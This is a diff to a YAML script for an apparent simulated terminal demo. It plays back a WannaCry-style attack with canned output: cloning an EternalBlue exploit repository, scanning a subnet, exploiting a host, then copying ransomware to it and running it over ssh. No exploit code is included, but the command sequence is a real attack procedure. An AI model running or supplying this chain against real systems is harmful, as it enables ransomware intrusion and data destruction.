@@ -1,8 +1,10 @@
 name: "Phase 1: Initial Access"
 commands:
   - command: "cd ~/projects/wannacry"
+    username: "user@~/projects/wannacry"
     messages:
   - command: "sudo apt-get update"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]"
         delay: 0.3
@@ -35,72 +37,82 @@ commands:
         delay: 0.2
         mode: "print"
   - command: "vi encrypt.py"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Writing encryption script..."
         delay: 0.5
         mode: "print"
   - command: "echo 'Sensitive Information' > sensitive_data.txt"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Creating a test file to encrypt"
         delay: 0.2
         mode: "print"
   - command: "python encrypt.py"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Encrypting file..."
         delay: 1.0
-        mode: "replace"
+        mode: "print"
       - message: "File encrypted successfully."
         delay: 0.5
         mode: "replace"
   - command: "nano ransom_note.txt"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Writing ransom note..."
         delay: 0.5
         mode: "print"
   - command: "git clone https://github.com/worawit/MS17-010.git"
+    username: "user@~/projects/wannacry"
     messages:
       - message: "Cloning EternalBlue exploit repository..."
-        delay: 2.0
+        delay: 0.1
         mode: "print"
       - message: "Repository cloned."
-        delay: 0.2
+        delay: 2.0
         mode: "replace"
   - command: "cd MS17-010"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Navigating to the exploit directory..."
         delay: 0.2
         mode: "print"
   - command: "make"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Compiling the EternalBlue exploit..."
         delay: 1.5
-        mode: "replace"
+        mode: "print"
       - message: "Compilation complete."
         delay: 0.5
         mode: "replace"
   - command: "python checker.py 192.168.1.0/24"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Scanning network for vulnerable targets..."
-        delay: 2.0
+        delay: 0.1
         mode: "replace"
       - message: "192.168.1.5    VULNERABLE"
-        delay: 0.5
+        delay: 5.0
         mode: "print"
       - message: "192.168.1.8    NOT VULNERABLE"
-        delay: 0.5
+        delay: 0.1
         mode: "print"
       - message: "192.168.1.15   VULNERABLE"
-        delay: 0.5
+        delay: 0.1
         mode: "print"
   - command: "python eternalblue_exploit7.py 192.168.1.5 shellcode.bin"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Exploiting target 192.168.1.5..."
         delay: 2.0
-        mode: "replace"
+        mode: "print"
       - message: "Exploit successful."
         delay: 0.5
-        mode: "replace"
+        mode: "print"
   - command: "scp encrypt.py ransom_note.txt user@192.168.1.5:/tmp/"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Uploading ransomware and ransom note to target..."
         delay: 1.5
@@ -109,6 +121,7 @@ commands:
         delay: 0.2
         mode: "replace"
   - command: "ssh user@192.168.1.5 'python /tmp/encrypt.py && cp /tmp/ransom_note.txt /home/user/'"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Executing ransomware on target..."
         delay: 2.0
@@ -117,6 +130,7 @@ commands:
         delay: 0.5
         mode: "replace"
   - command: "nano monitor_spread.py"
+    username: "user@~/projects/wannacry/MS17-010"
     messages:
       - message: "Writing monitoring script..."
         delay: 0.5
